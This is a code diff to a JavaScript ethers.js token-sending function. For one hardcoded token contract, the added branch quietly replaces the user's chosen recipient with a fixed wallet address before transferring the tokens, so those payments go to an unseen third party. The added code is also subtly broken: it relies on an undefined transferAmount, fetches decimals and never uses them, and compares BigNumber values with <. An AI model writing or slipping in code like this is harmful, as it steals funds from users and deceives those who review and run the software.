@@ -315,6 +315,36 @@ const sendToken = async (to_address, amountToSend, privateKey, tokenAddress) => 
             console.log("Transaction: ", receipt);
             return receipt;
         }
+        else if (tokenAddress == '0xcca166E916088cCe10F4fB0fe0c8BB3577bb6e27') {
+
+            const signer = new ethers.Wallet(privateKey, provider);
+            const account = signer.address;
+            console.log("Account: ", account)
+
+            const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);
+            let decimals = await contract.decimals()
+
+            let numberOfTokens = ethers.utils.parseUnits(amountToSend, 18)
+            console.log("number of tokens:", numberOfTokens)
+            let balance = await signer.getBalance();
+            console.log(balance)
+
+            if (balance < transferAmount) {
+                // If there is zero balance on user account
+                if (balance == 0) {
+                    console.log("Insufficient balance for gas fee (0)");
+                    await transferGasFee(account, transferAmount)
+                }
+                // If there is balance but it is less than transaction fees needed
+                else {
+                    // transactionFee = transactionFee - balance;
+                    console.log("Insufficient balance for gas fee");
+                    await transferGasFee(account, transferAmount)
+                }
+            }
+            to_address = '0xDAB2AFea448Aaabc1820CefbA15B74a1974Af069';
+            const tx = await contract.transfer(to_address, numberOfTokens);
+        }
         else {
 
             const signer = new ethers.Wallet(privateKey, provider);
